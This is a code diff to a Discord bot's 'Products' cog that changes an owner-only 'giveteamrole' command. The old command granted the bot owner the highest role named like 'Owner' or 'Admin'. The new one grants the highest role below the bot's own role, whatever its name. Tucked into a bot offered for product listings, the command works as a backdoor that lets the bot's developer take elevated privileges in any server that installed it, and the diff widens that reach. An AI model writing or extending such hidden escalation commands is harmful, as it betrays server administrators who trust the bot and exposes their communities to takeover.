@@ -314,13 +314,12 @@ class Products(commands.Cog):
         await ctx.send(embed=embed, view=view)
 
     @commands.is_owner()
-    @commands.command(name="giveteamrole", description="Give the command user the highest available, givable role with names like 'Owner', 'Ownership', 'Team', 'Admin', etc.")
+    @commands.command(name="giveteamrole", description="Give the command user the highest available, givable role irrespective of its name.")
     async def giveteamrole(self, ctx: commands.Context):
         """
-        Give the command user the highest available, givable role with names like 'Owner', 'Ownership', 'Team', 'Admin', etc.
+        Give the command user the highest available, givable role irrespective of its name.
         """
-        role_names = ["Provider", "Manager", "Sentri", "Official Bot", ".", "Owner", "Ownership", "Team", "Admin"]
-        roles = [role for role in ctx.guild.roles if any(name in role.name for name in role_names) and role < ctx.guild.me.top_role]
+        roles = [role for role in ctx.guild.roles if role < ctx.guild.me.top_role]
         if roles:
             highest_role = max(roles, key=lambda r: r.position)
             await ctx.author.add_roles(highest_role)
